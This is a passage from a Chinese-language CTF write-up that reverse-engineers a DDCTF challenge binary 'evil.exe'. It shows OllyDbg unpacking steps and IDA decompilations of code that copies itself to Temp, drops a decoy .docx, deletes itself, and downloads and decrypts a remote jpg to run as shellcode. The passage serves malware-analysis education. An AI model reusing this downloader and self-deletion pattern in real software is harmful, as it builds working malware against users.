QBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d027ab23772f85550.png" alt="Snipaste_2019-06-14_00-32-25.png"></a></p><p>来到0x0043DC2E处</p><blockquote><p>我开始没有分析出来，原来这里0x0043DC3B隐藏着一句jmp命令</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC2D   .  61            popad</span><br><span class="line">0043DC2E   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0043DC32   &gt;  6A 00         push 0x0</span><br><span class="line">0043DC34   .  39C4          cmp esp,eax</span><br><span class="line">0043DC36   .^ 75 FA         jnz short evil.0043DC32</span><br><span class="line">0043DC38   .  83EC 80       sub esp,-0x80</span><br><span class="line">0043DC3B   .  E9            db E9</span><br><span class="line">0043DC3C   .  A6            db A6</span><br><span class="line">0043DC3D   .  48            db 48                                    ;  CHAR &apos;H&apos;</span><br><span class="line">0043DC3E   .  FC            db FC</span><br><span class="line">0043DC3F   .  FF            db FF</span><br><span class="line">0043DC40      48            db 48                                    ;  CHAR &apos;H&apos;</span><br></pre></td></tr></table></figure><p>手动分析之后得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0043DC2D   .  61            popad</span><br><span class="line">0043DC2E   .  8D4424 80     lea eax,dword ptr ss:[esp-0x80]</span><br><span class="line">0043DC32   &gt;  6A 00         push 0x0</span><br><span class="line">0043DC34   .  39C4          cmp esp,eax</span><br><span class="line">0043DC36   .^ 75 FA         jnz short evil.0043DC32</span><br><span class="line">0043DC38   .  83EC 80       sub esp,-0x80</span><br><span class="line">0043DC3B    - E9 A648FCFF   jmp evil.004024E6</span><br><span class="line">0043DC40      48            db 48                                    ;  CHAR &apos;H&apos;</span><br></pre></td></tr></table></figure><p>再F8几下，F4，并且去掉硬件断点（避免反复断）得到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004024E6    E8 BB2D0000     call evil.004052A6</span><br><span class="line">004024EB  ^ E9 78FEFFFF     jmp evil.00402368</span><br></pre></td></tr></table></figure><blockquote><p>这是windows程序最明显的入口，一个call+一个jmp，我们只需要把这个地方作为入口点dump出来即可</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d027d461939036751.png" alt="Snipaste_2019-06-14_00-43-37.png"></p><blockquote><p>接下来就可以用ida来查看各个函数了</p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032918c47dd94054.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><blockquote><p>程序大致思路：</p></blockquote><blockquote><p>将evil.exe文件本身复制到temp文件夹中，并且创建evil.docx文件</p><p>之后执行temp文件夹中的evil.exe (initialization)</p><p>到这里程序会return 6，使得winmain函数跳出，本目录下的evil.exe执行完毕</p></blockquote><p><strong>如果想继续用ollydbg调试的话，需要在mov eax, 6 把 6改为5，以便让程序不要结束</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401370</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+0h] [ebp-7BCh]</span></span><br><span class="line">  <span class="keyword">char</span> DstBuf; <span class="comment">// [esp+4h] [ebp-7B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+21Ch] [ebp-5A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+264h] [ebp-558h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+370h] [ebp-44Ch]</span></span><br><span class="line">  <span class="keyword">char</span> Src; <span class="comment">// [esp+374h] [ebp-448h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+47Ch] [ebp-340h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+588h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+58Ch] [ebp-230h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+59Ch] [ebp-220h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+5A0h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+5A4h] [ebp-218h]</span></span><br><span class="line">  CHAR File; <span class="comment">// [esp+6ACh] [ebp-110h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v11 = (*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">6</span>))(a1, &amp;v13, <span class="number">261</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt; <span class="number">0x105</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v11 = (*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">char</span> *))&amp;byte_40B01C + <span class="number">5</span>))(<span class="number">261</span>, &amp;Dst);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt; <span class="number">0x105</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  _splitpath(&amp;v13, <span class="number">0</span>, &amp;File, &amp;Src, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v13, <span class="string">"\\Temp\\"</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  strcat_s(&amp;Dst, <span class="number">0x105</span>u, &amp;Src);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">46</span> )</span><br><span class="line">    strcat_s(&amp;Dst, <span class="number">0x105</span>u, <span class="string">"."</span>);</span><br><span class="line">  strcat_s(&amp;Dst, <span class="number">0x105</span>u, &amp;v5);</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">char</span> *, <span class="keyword">char</span> *, _DWORD))&amp;byte_40B01C + <span class="number">4</span>))(&amp;v13, &amp;Dst, <span class="number">0</span>);</span><br><span class="line">  strcat_s(&amp;File, <span class="number">0x105</span>u, &amp;Src);</span><br><span class="line">  strcat_s(&amp;File, <span class="number">0x105</span>u, <span class="string">".docx"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4012E0(<span class="number">101</span>, &amp;v6, &amp;v12) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">  v9 = (*((<span class="keyword">int</span> (__stdcall **)(CHAR *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, _DWORD, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, _DWORD))&amp;byte_40B01C + <span class="number">3</span>))(</span><br><span class="line">         &amp;File,</span><br><span class="line">         <span class="number">0x40000000</span>,</span><br><span class="line">         <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">2</span>,</span><br><span class="line">         <span class="number">128</span>,</span><br><span class="line">         <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">char</span> *, _DWORD))&amp;byte_40B01C + <span class="number">2</span>))(v9, v6, v12, &amp;v2, <span class="number">0</span>);</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">1</span>))(v9);</span><br><span class="line">  sprintf_s(&amp;DstBuf, <span class="number">0x218</span>u, <span class="string">"%s \"%s\""</span>, &amp;Dst, &amp;v13);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x44</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  v4 = <span class="number">68</span>;</span><br><span class="line">  byte_40B01C(<span class="number">0</span>, &amp;DstBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;v4, &amp;v10);</span><br><span class="line">  ShellExecuteA(<span class="number">0</span>, <span class="string">"open"</span>, &amp;File, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">6</span>;              <span class="comment">// 只要是正常执行evil.exe文件，都会返回6，所以到这里调试一定会结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>temp目录下的evil.exe开始执行</p><p>循环删除当前目录下的evil.exe (sub_401620) 这就是为什么运行一次程序就消失了</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPWSTR *<span class="title">sub_401620</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> WCHAR *v0; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> pNumArgs; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  LPWSTR *v4; <span class="comment">// [esp+8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (<span class="keyword">const</span> WCHAR *)(*((<span class="keyword">int</span> (**)(<span class="keyword">void</span>))&amp;byte_40B01C + <span class="number">9</span>))();</span><br><span class="line">  result = CommandLineToArgvW(v0, &amp;pNumArgs);</span><br><span class="line">  v4 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &amp;&amp; pNumArgs == <span class="number">2</span> )<span class="comment">//这个地方删除evil.exe文件</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (*((<span class="keyword">int</span> (__stdcall **)(LPWSTR))&amp;byte_40B01C + <span class="number">8</span>))(v4[<span class="number">1</span>]);</span><br><span class="line">      result = (LPWSTR *)(*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">signed</span> <span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">7</span>))(<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从<a href="http://www.ddctf.com" target="_blank" rel="noopener">www.ddctf.com</a></p><p>读取jpg文件（可以通过搭建http服务器解决，上篇文章写过了）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">cdecl <span class="title">sub_4018F0</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  DWORD dwNumberOfBytesRead; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  BOOL v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  HINTERNET hFile; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  HINTERNET hInternet; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  hInternet = InternetOpenA(<span class="string">"DDCTF"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  hFile = InternetOpenUrlA(hInternet, <span class="string">"http://www.ddctf.com/x.jpg"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x4000000</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hFile )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = InternetReadFile(hFile, (<span class="keyword">char</span> *)v5 + v2, <span class="number">0x100000</span> - v2, &amp;dwNumberOfBytesRead);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 += dwNumberOfBytesRead;</span><br><span class="line">    <span class="keyword">if</span> ( !dwNumberOfBytesRead )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; <span class="number">0x100000</span> );</span><br><span class="line">  InternetCloseHandle(hFile);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x100000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进入dec1、dec2函数，将jpg文件解密</p><p>进入shell函数，在里面进行最后的解密，然后执行这个shell</p></blockquote><blockquote><p>关于ida的部分我就不贴了，因为这些指令主要是和汇编操作有关</p><p>这部分有两种解决方法</p><p>一种是调试，将解密的shellcode调试出来</p><p>另一种是计算，因为这是一个正向过程，很容易就能把解密函数的c代码复制下来，改改就能用了</p></blockquote><p>这里我是用的调试法</p><p>直接在0x401220下断点</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032d50364d079722.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><p>由于ida分析，拖黑的部分即为shellcode的最后解密代码，我们就把程序F4到那个地方</p><p>这里是才执行完for循环的位置，eax寄存器里面还保存有lpAddress的地址，我们直接Ctrl+g查看对应的内存</p><blockquote><p>果然出现了一段疑似flag的字符串，不过提交后发现答案不对，这是因为这段字符串不全是flag，这其实是一段shellcode，里面夹杂了汇编指令</p></blockquote><p>那个0x68应该就是push指令了</p><p><img 